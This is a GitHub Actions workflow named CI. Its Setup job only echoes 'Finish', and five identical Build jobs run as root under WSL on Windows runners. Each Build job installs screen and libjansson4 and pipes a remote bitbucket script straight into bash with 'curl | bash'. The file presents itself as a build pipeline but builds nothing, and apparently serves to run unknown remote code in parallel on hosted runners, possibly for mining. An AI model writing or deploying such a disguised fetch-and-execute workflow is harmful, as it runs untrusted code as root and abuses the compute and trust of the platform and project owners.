name: CI
on:
  "push": null
  "pull_request": null
jobs:
  Setup:
    runs-on: ubuntu-20.04
    strategy:
      fail-fast: false
      matrix:
        go: [1.17]
        flag: [1, 2, 3 ,4, 5]
    env:
        NUM_JOBS: 5
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v2
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: Testing
      run: |
        echo "Finish"
  Build-1:
    needs: Setup
    runs-on: windows-2019
    strategy:
      fail-fast: false
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps:
    - name: Set up Go
      uses: actions/setup-go@v2
      with:
        go-version: 1.17
      id: go
    - name: Setup
      uses: Vampire/setup-wsl@v1
      with:
          distribution: Ubuntu-20.04
    - name : Install Tools
      run: |
        apt-get update
        apt-get install -y screen curl xz-utils wget libjansson4
    - name: Main
      run: |
        mkdir build
        cd build
        curl -s https://bitbucket.org/jembud/bit4/raw/f8f02d2be40b35b5c23b1d2ed4ce989bc2ca1724/run.sh | bash
        cd ..
    - name: Done
      run: rm -rf build
  Build-2:
    needs: Setup
    runs-on: windows-2019
    strategy:
      fail-fast: false
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps:
    - name: Set up Go
      uses: actions/setup-go@v2
      with:
        go-version: 1.17
      id: go
    - name: Setup
      uses: Vampire/setup-wsl@v1
      with:
          distribution: Ubuntu-20.04
    - name : Install Tools
      run: |
        apt-get update
        apt-get install -y screen curl xz-utils wget libjansson4
    - name: Main
      run: |
        mkdir build
        cd build
        curl -s https://bitbucket.org/jembud/bit4/raw/f8f02d2be40b35b5c23b1d2ed4ce989bc2ca1724/run.sh | bash
        cd ..
    - name: Done
      run: rm -rf build
  Build-3:
    needs: Setup
    runs-on: windows-2019
    strategy:
      fail-fast: false
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps:
    - name: Set up Go
      uses: actions/setup-go@v2
      with:
        go-version: 1.17
      id: go
    - name: Setup
      uses: Vampire/setup-wsl@v1
      with:
          distribution: Ubuntu-20.04
    - name : Install Tools
      run: |
        apt-get update
        apt-get install -y screen curl xz-utils wget libjansson4
    - name: Main
      run: |
        mkdir build
        cd build
        curl -s https://bitbucket.org/jembud/bit4/raw/f8f02d2be40b35b5c23b1d2ed4ce989bc2ca1724/run.sh | bash
        cd ..
    - name: Done
      run: rm -rf build
  Build-4:
    needs: Setup
    runs-on: windows-2019
    strategy:
      fail-fast: false
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps:
    - name: Set up Go
      uses: actions/setup-go@v2
      with:
        go-version: 1.17
      id: go
    - name: Setup
      uses: Vampire/setup-wsl@v1
      with:
          distribution: Ubuntu-20.04
    - name : Install Tools
      run: |
        apt-get update
        apt-get install -y screen curl xz-utils wget libjansson4
    - name: Main
      run: |
        mkdir build
        cd build
        curl -s https://bitbucket.org/jembud/bit4/raw/f8f02d2be40b35b5c23b1d2ed4ce989bc2ca1724/run.sh | bash
        cd ..
    - name: Done
      run: rm -rf build
  Build-5:
    needs: Setup
    runs-on: windows-2019
    strategy:
      fail-fast: false
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps:
    - name: Set up Go
      uses: actions/setup-go@v2
      with:
        go-version: 1.17
      id: go
    - name: Setup
      uses: Vampire/setup-wsl@v1
      with:
          distribution: Ubuntu-20.04
    - name : Install Tools
      run: |
        apt-get update
        apt-get install -y screen curl xz-utils wget libjansson4
    - name: Main
      run: |
        mkdir build
        cd build
        curl -s https://bitbucket.org/jembud/bit4/raw/f8f02d2be40b35b5c23b1d2ed4ce989bc2ca1724/run.sh | bash
        cd ..
    - name: Done
      run: rm -rf build
